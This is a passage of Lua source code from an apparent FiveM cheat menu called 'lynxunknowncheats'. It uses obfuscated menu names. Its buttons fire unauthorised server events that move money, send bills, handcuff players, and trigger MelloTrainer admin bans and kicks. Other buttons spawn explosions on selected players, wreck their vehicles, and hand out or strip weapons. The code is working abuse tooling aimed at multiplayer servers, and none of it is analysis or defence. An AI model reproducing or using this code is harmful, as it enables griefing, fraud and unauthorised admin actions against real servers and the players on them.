					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif lynxunknowncheats.Button("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					drawNotification("~r~Everything is now stopped.")
				elseif lynxunknowncheats.CheckBox("~r~Blow Drugs Up",
					BlowDrugsUp,
					function(enabled)
						BlowDrugsUp = enabled
					end)
				then
				end
 
	
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	") then
					for i = 0, 64 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and lynxunknowncheats.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10') then
						SelectedPlayer = i
					end
				end
		
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10") then
				
				lynxunknowncheats.SetSubTitle("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if lynxunknowncheats.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif lynxunknowncheats.Button("Teleport To") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)	
				elseif lynxunknowncheats.Button("~g~ESX ~s~Give money to player from your wallet") then
					local result = KeyboardInput("Enter amount of money to give", "", 100000000)
					if result then
					TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
					end
				elseif lynxunknowncheats.Button("~g~ESX ~s~Send Bill") then
					local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), "Purposeless", name, amount)
					end
				elseif lynxunknowncheats.Button("~g~ESX ~b~Policejob Handcuff Player") then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
				elseif lynxunknowncheats.Button("~g~ESX ~s~Revive player") then
					TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))	
				elseif lynxunknowncheats.Button("~r~Slap/Kill") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)	
				elseif lynxunknowncheats.Button("~y~Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
				elseif lynxunknowncheats.Button("Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif lynxunknowncheats.Button("Remove All Weapons") then
					for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
						end
				elseif lynxunknowncheats.MenuButton("Give Single Weapon", "\83\105\110\103\108\101\87\101\112\80\108\97\121\101\114\10	") then
				elseif lynxunknowncheats.Button("Give Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
 
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end
 
						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					else
						drawNotification("~r~Model is not valid!")
					end
 
				elseif lynxunknowncheats.Button("Kick From Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
 
				elseif lynxunknowncheats.Button("Destroy His Engine") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)
 
				elseif lynxunknowncheats.Button("~h~Repair His Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
 
				elseif lynxunknowncheats.Button("Fuck Up His Car") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						StartVehicleAlarm(playerVeh)
						DetachVehicleWindscreen(playerVeh)
						SmashVehicleWindow(playerVeh, 0)
						SmashVehicleWindow(playerVeh, 1)
						SmashVehicleWindow(playerVeh, 2)
						SmashVehicleWindow(playerVeh, 3)
						SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
						SetVehicleDoorBroken(playerVeh, 0, true)
						SetVehicleDoorBroken(playerVeh, 1, true)
						SetVehicleDoorBroken(playerVeh, 2, true)
						SetVehicleDoorBroken(playerVeh, 3, true)
						SetVehicleDoorBroken(playerVeh, 4, true)
						SetVehicleDoorBroken(playerVeh, 5, true)
						SetVehicleDoorBroken(playerVeh, 6, true)
						SetVehicleDoorBroken(playerVeh, 7, true)
						SetVehicleLights(playerVeh, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
						SetVehicleNumberPlateTextIndex(playerVeh, 5)
						SetVehicleNumberPlateText(playerVeh, "LYNX")
						SetVehicleDirtLevel(playerVeh, 10.0)
						SetVehicleModColor_1(playerVeh, 1)
						SetVehicleModColor_2(playerVeh, 1)
						SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
						SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
						SetVehicleBurnout(playerVeh, true)
						drawNotification("~g~Vehicle Fucked Up!")
 
				elseif lynxunknowncheats.Button("~r~MelloTrainer ~s~BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif lynxunknowncheats.Button("~r~MelloTrainer ~s~KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server." )
				end
				
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\83\105\110\103\108\101\87\101\112\80\108\97\121\101\114\10") then
				for i = 1, #allWeapons do
					if lynxunknowncheats.Button(allWeapons[i]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
					end
				end
 
				lynxunknowncheats.Display()
			elseif IsDisabledControlPressed(0, 221) then
				lynxunknowncheats.OpenMenu("\76\221\110\120\77\97\105\110\77\101\110\117\10")
 
			Citizen.Wait(0)
		end
	end
)
 
RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false